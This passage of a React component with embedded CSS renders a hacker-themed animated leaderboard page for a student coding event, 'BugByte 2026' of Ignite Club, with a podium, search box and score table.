        .typewriter{font-family:'Share Tech Mono',monospace;font-size:12px;color:rgba(0,255,200,0.55);text-align:left;line-height:2;letter-spacing:0.07em;white-space:pre;min-height:58px;margin-bottom:44px}
        .cursor{display:inline-block;width:8px;height:14px;background:#00ffcc;animation:blink 0.75s step-end infinite;vertical-align:bottom}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}

        /* LAYOUT */
        .lb-inner{position:relative;z-index:3;max-width:1160px;margin:0 auto;padding:clamp(16px,4vw,52px) clamp(12px,3vw,36px) 64px}

        /* ANIMATIONS */
        @keyframes g1{0%,90%,100%{opacity:0;transform:translateX(0)}91%{opacity:0.85;transform:translateX(-4px)}95%{opacity:0.5;transform:translateX(2px)}}
        @keyframes g2{0%,86%,100%{opacity:0;transform:translateX(0)}87%{opacity:0.75;transform:translateX(4px)}92%{opacity:0.4;transform:translateX(-2px)}}
        @keyframes fadeUp{from{opacity:0;transform:translateY(32px)}to{opacity:1;transform:translateY(0)}}
        .fu{animation:fadeUp 0.8s cubic-bezier(0.34,1.2,0.64,1) both}
        .fu1{animation-delay:0.1s}.fu2{animation-delay:0.28s}.fu3{animation-delay:0.44s}.fu4{animation-delay:0.6s}
        @keyframes scanCard{0%{top:-4px}100%{top:105%}}
        @keyframes sparkOut{0%{opacity:1;transform:var(--init-t,rotate(0deg) translateX(0))}100%{opacity:0;transform:var(--final-t,rotate(0deg) translateX(80px)) scale(0)}}

        /* LIVE BADGE */
        .live{display:inline-flex;align-items:center;gap:7px;padding:5px 16px;border-radius:2px;background:rgba(0,255,160,0.05);border:1px solid rgba(0,255,160,0.22);font-size:9px;color:#00ffa0;letter-spacing:0.22em;clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%)}
        .live-dot{width:7px;height:7px;border-radius:50%;background:#00ffa0;animation:ldot 1.2s ease-in-out infinite;box-shadow:0 0 8px #00ffa0}
        @keyframes ldot{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.7);opacity:0.4}}

        /* TICKER */
        .ticker{overflow:hidden;border-top:1px solid rgba(0,255,160,0.07);border-bottom:1px solid rgba(0,255,160,0.07);padding:10px 0;background:rgba(0,255,160,0.018)}
        .ticker-t{display:flex;gap:72px;animation:tick 32s linear infinite;white-space:nowrap}
        @keyframes tick{from{transform:translateX(0)}to{transform:translateX(-50%)}}
        .tick-i{font-size:11px;color:rgba(0,255,160,0.38);letter-spacing:0.12em;flex-shrink:0}

        /* DIVIDER */
        .div{height:1px;background:linear-gradient(90deg,transparent,#00ffcc66,#00aaff44,transparent);margin:0 auto;animation:divGlow 3s ease-in-out infinite alternate}
        @keyframes divGlow{0%{opacity:0.5}100%{opacity:1;filter:blur(0.5px)}}

        /* STATS */
        .stats-bar{display:flex;justify-content:center;gap:clamp(20px,4vw,70px);padding:22px 32px;border-radius:2px;background:rgba(0,4,14,0.72);border:1px solid rgba(0,255,160,0.09);backdrop-filter:blur(14px);clip-path:polygon(14px 0%,100% 0%,calc(100% - 14px) 100%,0% 100%)}
        .stat-v{font-family:'Orbitron',monospace;font-size:clamp(20px,3vw,32px);font-weight:900;color:#00ffcc;text-shadow:0 0 24px #00ffcc66}
        .stat-l{font-size:8px;color:rgba(0,255,160,0.28);letter-spacing:0.2em;margin-top:4px}
        .stat-sep{width:1px;background:rgba(0,255,160,0.1);align-self:stretch}

        /* TABLE */
        .card-wrap{background:rgba(0,4,14,0.72);border:1px solid rgba(0,255,160,0.09);border-radius:2px;overflow:hidden;backdrop-filter:blur(18px);box-shadow:0 0 60px rgba(0,255,160,0.03),inset 0 1px 0 rgba(0,255,160,0.05);position:relative}
        .card-wrap::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 26px,rgba(0,255,160,0.012) 26px,rgba(0,255,160,0.012) 27px);pointer-events:none;z-index:0}
        .lb-table{width:100%;border-collapse:separate;border-spacing:0 3px;padding:10px 14px;position:relative;z-index:1}
        .lb-table thead th{font-family:'Orbitron',monospace;font-size:8px;letter-spacing:0.24em;color:rgba(0,255,160,0.32);padding:14px 18px;text-align:left;border-bottom:1px solid rgba(0,255,160,0.06)}
        .lb-table thead th.c{text-align:center}

        /* LINKS */
        .lb-link{display:inline-flex;align-items:center;gap:5px;padding:5px 13px;border-radius:2px;font-size:11px;font-family:'Share Tech Mono',monospace;text-decoration:none;transition:all 0.22s;letter-spacing:0.06em;border:1px solid;clip-path:polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%)}
        .lb-link-blue{border-color:rgba(0,170,255,0.2);color:rgba(0,170,255,0.6);background:rgba(0,170,255,0.04)}
        .lb-link-blue:hover{border-color:rgba(0,170,255,0.6);color:#00aaff;background:rgba(0,170,255,0.1);box-shadow:0 0 14px rgba(0,170,255,0.25)}
        .lb-link-green{border-color:rgba(0,255,160,0.2);color:rgba(0,255,160,0.6);background:rgba(0,255,160,0.04)}
        .lb-link-green:hover{border-color:rgba(0,255,160,0.6);color:#00ffa0;background:rgba(0,255,160,0.1);box-shadow:0 0 14px rgba(0,255,160,0.25)}
        .lb-dash{color:rgba(255,255,255,0.07);font-family:'Share Tech Mono',monospace;font-size:12px}

        /* SEARCH */
        .search-wrap{display:flex;justify-content:center;position:sticky;top:12px;z-index:40}
        .search-box{position:relative;width:100%;max-width:540px}
        .search-input{width:100%;background:rgba(0,4,14,0.88);border:1px solid rgba(0,255,160,0.16);border-radius:2px;padding:13px 20px 13px 46px;color:#e0ffe8;font-size:13px;outline:none;backdrop-filter:blur(20px);font-family:'Share Tech Mono',monospace;letter-spacing:0.05em;transition:all 0.3s;clip-path:polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%)}
        .search-input::placeholder{color:rgba(0,255,160,0.18)}
        .search-input:focus{border-color:rgba(0,255,160,0.48);box-shadow:0 0 0 2px rgba(0,255,160,0.07),0 0 32px rgba(0,255,160,0.1);background:rgba(0,8,22,0.92)}
        .search-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:rgba(0,255,160,0.32);font-size:15px;pointer-events:none}

        /* MOBILE */
        .desktop{display:none}
        .mobile{display:flex;flex-direction:column;gap:10px}
        @media(min-width:768px){.desktop{display:block}.mobile{display:none}}

        /* FOOTER */
        .footer{display:flex;flex-direction:column;align-items:center;gap:10px;padding:40px 18px;border-top:1px solid rgba(255,255,255,0.04);position:relative;z-index:3;margin-top:72px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent)}
        .footer .brand{display:flex;align-items:center;gap:12px}
        .footer .brand svg{width:36px;height:36px}
        .footer .title{font-family:'Orbitron',monospace;color:#ffffff;font-weight:700;letter-spacing:0.18em;font-size:12px}
        .footer .muted{color:rgba(255,255,255,0.78);font-family:'Share Tech Mono',monospace;font-size:12px}
        .footer .links{display:flex;gap:10px}
        .footer .links a{color:rgba(255,255,255,0.78);text-decoration:none;font-family:'Share Tech Mono',monospace;padding:6px 10px;border-radius:6px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.02);transition:all 0.16s}
        .footer .links a:hover{color:#000;background:#7cff7c;border-color:#7cff7c;box-shadow:0 8px 24px rgba(124,255,124,0.06)}

        ::-webkit-scrollbar{width:4px}
        ::-webkit-scrollbar-track{background:#000308}
        ::-webkit-scrollbar-thumb{background:rgba(0,255,160,0.18);border-radius:99px}
        ::-webkit-scrollbar-thumb:hover{background:rgba(0,255,160,0.4)}
      `}</style>

      <div className="lb">
        <SpaceCanvas />
        <MatrixRain />

        <HackJoinButton />
        <HackPopup visible={showHackPopup} onClose={() => setShowHackPopup(false)} />

        {/* WELCOME */}
        {showWelcome && (
          <div className={`wl${exiting ? " exit" : ""}`}>
            <div className="wl-scan" />
            <div className="corner tl" /><div className="corner tr" />
            <div className="corner bl" /><div className="corner br" />
            <div style={{ textAlign: "center", padding: "0 28px", position: "relative", zIndex: 1 }}>
              <div className="typewriter">{typeText}<span className="cursor" /></div>
              <h1 style={{ fontFamily: "'Orbitron',monospace", fontWeight: 900, fontSize: "clamp(30px,8vw,68px)", lineHeight: 1, marginBottom: 10, letterSpacing: "0.06em" }}>
                <Glitch style={{ color: "#00ffcc", textShadow: "0 0 30px #00ffcc88, 0 0 80px #00ffcc22" }}>IGNITE CLUB</Glitch>
              </h1>
              <h2 style={{ fontFamily: "'VT323',monospace", fontSize: "clamp(22px,5vw,42px)", color: "#00aaff", textShadow: "0 0 20px #00aaff77", marginBottom: 10, letterSpacing: "0.1em" }}>
                BUGBYTE 2026 🎉
              </h2>
              <p style={{ color: "rgba(0,255,160,0.22)", fontSize: 9, letterSpacing: "0.3em", marginBottom: 52, fontFamily: "'Share Tech Mono',monospace" }}>
                VISHVESHWARYA GROUP OF INSTITUTION
              </p>
              <button className="enter-btn" onClick={handleEnter}><span className="breach-text">⚡ BREACH SYSTEM</span></button>
            </div>
          </div>
        )}

        {/* TICKER */}
        {!showWelcome && sorted.length > 0 && (
          <div className="ticker">
            <div className="ticker-t">
              {[...Array(2)].flatMap((_, ri) =>
                sorted.map((s, si) => (
                  <span key={`${ri}-${si}`} className="tick-i">
                    #{s.rank}&nbsp;{s.name}&nbsp;<span style={{ color: "rgba(0,170,255,0.45)" }}>◈</span>&nbsp;{s.points} XP&nbsp;<span style={{ color: "rgba(0,255,100,0.28)" }}>∥</span>&nbsp;
                  </span>
                ))
              )}
            </div>
          </div>
        )}

        <div className="lb-inner">

          {/* HEADER */}
          <div className="fu fu1" style={{ textAlign: "center", marginBottom: 46 }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 22 }}>
              <span className="live"><span className="live-dot" />LIVE UPLINK</span>
            </div>
            <p style={{ color: "rgba(0,255,160,0.2)", fontSize: 9, letterSpacing: "0.32em", marginBottom: 18, fontFamily: "'Share Tech Mono',monospace" }}>
              ∥ VISHVESHWARYA GROUP OF INSTITUTION ∥
            </p>
            <h1 style={{ fontFamily: "'Orbitron',monospace", fontWeight: 900, fontSize: "clamp(26px,6.5vw,58px)", lineHeight: 1.05, marginBottom: 12, letterSpacing: "0.06em" }}>
              <Glitch style={{ color: "#00ffcc", textShadow: "0 0 22px #00ffcc77, 0 0 55px #00ffcc22" }}>IGNITE CLUB</Glitch>
            </h1>
            <h2 style={{ fontFamily: "'VT323',monospace", fontSize: "clamp(16px,3.5vw,28px)", color: "#00aaff", textShadow: "0 0 18px #00aaff66", marginBottom: 24, letterSpacing: "0.1em" }}>
              ▸ BUGBYTE — NEURAL LEADERBOARD
            </h2>
            <div className="div" style={{ maxWidth: 460 }} />
          </div>

          {/* STATS */}
          <div className="fu fu2" style={{ marginBottom: 50 }}>
            <div ref={statsRef} className="stats-bar" style={{ opacity: statsVisible ? 1 : 0, transform: statsVisible ? "none" : "translateY(22px)", transition: "all 0.6s ease 0.1s" }}>
              <div style={{ textAlign: "center" }}>
                <div className="stat-v"><Counter value={sorted.length} visible={statsVisible} /></div>
                <div className="stat-l">OPERATIVES</div>
              </div>
              <div className="stat-sep" />
              <div style={{ textAlign: "center" }}>
                <div className="stat-v"><Counter value={top3[0]?.points || 0} visible={statsVisible} /></div>
                <div className="stat-l">TOP SCORE</div>
              </div>
              <div className="stat-sep" />
              <div style={{ textAlign: "center" }}>
                <div className="stat-v"><Counter value={totalPts} visible={statsVisible} /></div>
                <div className="stat-l">TOTAL XP</div>
              </div>
            </div>
          </div>

          {/* PODIUM */}
          {top3.length > 0 && (
            <div ref={podiumRef} className="fu fu3" style={{ marginBottom: 72 }}>
              <p style={{ textAlign: "center", color: "rgba(0,255,160,0.28)", fontSize: 9, letterSpacing: "0.32em", marginBottom: 40, fontFamily: "'Share Tech Mono',monospace" }}>
                ◈ &nbsp; ELITE OPERATIVES &nbsp; ◈
              </p>
              <div style={{ display: "flex", alignItems: "flex-end", justifyContent: "center", gap: "clamp(12px,3vw,38px)", perspective: "1100px" }}>
                <PodiumCard student={top3[1]} position={2} visible={podiumVisible} />
                <PodiumCard student={top3[0]} position={1} visible={podiumVisible} />
                <PodiumCard student={top3[2]} position={3} visible={podiumVisible} />
              </div>
            </div>
          )}

          {/* SEARCH */}
          <div className="fu fu4 search-wrap" style={{ marginBottom: 30 }}>
            <div className="search-box">
              <span className="search-icon">⬡</span>
              <input className="search-input" type="text" placeholder="SCAN BY ROLL / NAME..." value={search} onChange={e => setSearch(e.target.value)} />
            </div>
          </div>

          {/* DESKTOP TABLE */}
          <div className="desktop">
            <div className="card-wrap">
              <table className="lb-table">
                <thead>
                  <tr>
                    <th className="c" style={{ width: 72 }}>RANK</th>
                    <th className="c">NODE_ID</th>
                    <th>OPERATIVE</th>
                    <th className="c">XP_SCORE</th>
                    <th className="c">LINKS</th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((item, i) => <TerminalRow key={item._id} item={item} index={i} medal={medal(item.rank)} />)}
                  {filtered.length === 0 && (
                    <tr><td colSpan={5} style={{ textAlign: "center", padding: "52px 0", color: "rgba(0,255,160,0.18)", fontFamily: "'Share Tech Mono',monospace", fontSize: 12, letterSpacing: "0.18em" }}>◈ NO SIGNAL DETECTED ◈</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>

          {/* MOBILE */}
          <div className="mobile">
            {filtered.map((item, i) => <MobileCard key={item._id} item={item} index={i} medal={medal(item.rank)} />)}
            {filtered.length === 0 && (
              <p style={{ textAlign: "center", color: "rgba(0,255,160,0.18)", marginTop: 52, letterSpacing: "0.18em", fontFamily: "'Share Tech Mono',monospace", fontSize: 12 }}>◈ NO SIGNAL DETECTED ◈</p>
            )}
          </div>
        </div>

        {/* FOOTER */}
        <footer className="footer">
          <div className="brand">
            <img src="/vite.png" alt="logo" style={{ width: 36, height: 36, objectFit: 'contain', borderRadius: 6 }} />
            <div>
              <div className="title">IGNITE_CLUB</div>
              <div className="muted">BUGBYTE 2026 — NEURAL LEADERBOARD</div>
            </div>
          </div>
          <div className="links" style={{ marginTop: 8 }}>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="https://www.linkedin.com/in/aarav-kumar-77494030a/" target="_blank" rel="noreferrer">Contact</a>
          </div>
          <div style={{ color: "rgba(255,255,255,0.9)", fontSize: 12, marginTop: 8, fontFamily: "'Share Tech Mono',monospace" }}>© 2026 — ALL NODES SECURED</div>
        </footer>
      </div>
    </>
  );
}